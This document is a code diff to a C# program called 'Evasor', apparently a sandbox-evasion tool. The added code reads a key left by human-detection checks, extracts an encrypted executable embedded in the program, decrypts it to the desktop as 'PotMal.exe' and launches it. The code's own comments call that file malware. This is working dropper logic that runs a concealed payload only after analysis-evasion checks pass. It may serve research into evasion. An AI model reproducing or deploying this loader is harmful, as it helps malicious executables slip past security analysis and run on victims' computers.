@@ -12,6 +12,8 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Text.RegularExpressions;
 using WUApiLib;
+using System.Text;
+using System.Security.Cryptography;
 
 namespace Evasor
 {
@@ -270,6 +272,37 @@ namespace Evasor
         [DllImport("shell32.dll")]
         private static extern int SHQueryRecycleBin(string pszRootPath,
             ref SHQUERYRBINFO pSHQueryRBInfo);
+
+        //Decrypt function for exec sample/Mal
+        public static void DecryptFile(string inputFile, string outputFile)
+        {
+
+            {
+                UnicodeEncoding UE = new UnicodeEncoding();
+                byte[] key = UE.GetBytes(password);
+
+                FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
+
+                RijndaelManaged RMCrypto = new RijndaelManaged();
+
+                CryptoStream cs = new CryptoStream(fsCrypt,
+                    RMCrypto.CreateDecryptor(key, key),
+                    CryptoStreamMode.Read);
+
+                FileStream fsOut = new FileStream(outputFile, FileMode.Create);
+
+                int data;
+                while ((data = cs.ReadByte()) != -1)
+                    fsOut.WriteByte((byte)data);
+
+                fsOut.Close();
+                cs.Close();
+                fsCrypt.Close();
+
+            }
+        }
+        public static string password = "";
+
         static void Main(string[] args)
         {
             //Hide Console
@@ -878,7 +911,8 @@ namespace Evasor
             {
                 otpt += "\nWinograd Schema Challenge passed";
                 string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RTPass.txt");
-                if (text.EndsWith("1"))
+                string[] opArr = text.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
+                if (int.Parse(opArr[1]) == 1)
                 {
                     otpt += "\nReverse Turing Captcha test passed";
                 }
@@ -886,7 +920,8 @@ namespace Evasor
                 {
                     otpt += "\nReverse Turing Captcha test failed" + "###############################";
                 }
-
+                password = opArr[2];
+                otpt += "\nKey = " + opArr[2];
                 //Delete
                 File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RTPass.txt");
             }
@@ -911,6 +946,50 @@ namespace Evasor
                 otpt += "\nThe RT,WSC tests were not performed or canceled" + "###############################";
             }
             otpt += "\n";
+
+            //Decrypting the malware/executable - sampleMalEnc.exe-----------------------------------------------
+            try
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.otptEnc.exe"))
+                {
+                    using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.otptEnc.exe"), FileMode.Create))
+                    {
+                        for (int i = 0; i < stream.Length; i++)
+                        {
+                            fileStream.WriteByte((byte)stream.ReadByte());
+                        }
+                        fileStream.Close();
+                    }
+                }
+            }
+            catch
+            {
+                otpt += "\nUnable to extract resource sampleMalEnc.exe" + "###############################";
+            }
+
+            //calling Decrypt
+            try
+            {
+                DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.otptEnc.exe"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe"));
+                //Start Mal/exec
+                try
+                {
+                    Process RTProc = new Process();
+                    ProcessStartInfo RTstartInfo = new ProcessStartInfo();
+                    RTstartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe");
+                    RTProc.StartInfo = RTstartInfo;
+                    RTProc.Start();
+                }
+                catch
+                {
+                    otpt += "\nUnable to execute PotMal.exe" + "###############################";
+                }
+            }
+            catch
+            {
+                otpt += "\nUnable to decrypt executable";
+            }
 
             //Checking final otpt
             //Console.WriteLine(otpt);
